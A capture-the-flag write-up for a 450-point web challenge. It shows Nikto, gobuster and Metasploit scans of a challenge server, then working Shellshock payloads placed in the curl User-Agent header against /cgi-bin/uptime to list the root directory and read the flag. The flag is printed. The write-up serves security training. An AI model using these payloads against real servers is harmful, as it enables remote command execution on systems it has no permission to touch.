# Baby Mama Trauma

## Web: 450 Points

## Challenge

We've been working on the template for the new home page. Can you check to see if there's anything we should be worried about?

[ [Start](http://challenges.laptophackingcoffee.org:4242/) ]

Note: The server resets to default every 30 minutes. All progress will be lost.

## Solution


http://challenges.laptophackingcoffee.org:4242/cgi-bin/uptime

http://challenges.laptophackingcoffee.org:4242/script

```javascript
$(document).ready(function(){
	/* This code is executed after the DOM has been completely loaded */
	$('nav a,footer a.up').click(function(e){
		// If a link has been clicked, scroll the page to the link's hash target:		
		$.scrollTo( this.hash || 0, 1500);
		e.preventDefault();
	});

});
```

Nikto:
```
$ nikto -host challenges.laptophackingcoffee.org -p 4242
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          35.237.149.50
+ Target Hostname:    challenges.laptophackingcoffee.org
+ Target Port:        4242
+ Start Time:         2020-07-07 19:36:21 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Debian)
+ Server may leak inodes via ETags, header found with file /, inode: 1296216, size: 7197, mtime: Wed Feb 17 10:
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some fo
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the si
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ /cgi-bin/uptime: Gateway to the unix command, may be able to submit extra commands
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8676 requests: 1 error(s) and 12 item(s) reported on remote host
+ End Time:           2020-07-07 19:46:02 (GMT-6) (581 seconds)
---------------------------------------------------------------------------
```

possibly interesting:
```
+ /cgi-bin/uptime: Gateway to the unix command, may be able to submit extra commands
```

Directory Listing section

https://metalkey.github.io/shellshock-explained--exploitation-tutorial.html

The Shellshock Bug In About Four Minutes

https://youtu.be/aKShnpOXqn0

Remote Exploit ShellShock Vulnerability CVE-2014-6271: 2 Easy Methods

https://www.youtube.com/watch?v=sY-A38zi_GU

```
$ curl -A '() { :;}; echo "Content-Type: text/plain"; echo; /bin/ls /' http://challenges.laptophackingcoffee.org:4242/cgi-bin/uptime
bin
boot
dev
etc
flag.txt
home
lib
lib64
main.sh
...

$ curl -A '() { :;}; echo "Content-Type: text/plain"; echo; /bin/cat /flag.txt ' http://challenges.laptophackingcoffee.org:4242/cgi-bin/uptime
LHC{Sh377ShookD00d}
```

gobuster
```
$ gobuster dir -u http://challenges.laptophackingcoffee.org:4242/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://challenges.laptophackingcoffee.org:4242/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/07/07 19:37:39 Starting gobuster
===============================================================
/index (Status: 200)
/img (Status: 301)
/script (Status: 200)
/styles (Status: 200)
===============================================================
2020/07/07 19:46:43 Finished
===============================================================
```

msfconsole
```
msf5 auxiliary(scanner/http/dir_scanner) > exploit

[*] Detecting error code
[*] Using code '404' as not found for 35.237.149.50
[+] Found http://35.237.149.50:4242/cgi-bin/ 403 (35.237.149.50)
[+] Found http://35.237.149.50:4242/icons/ 403 (35.237.149.50)
[+] Found http://35.237.149.50:4242/img/ 200 (35.237.149.50)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```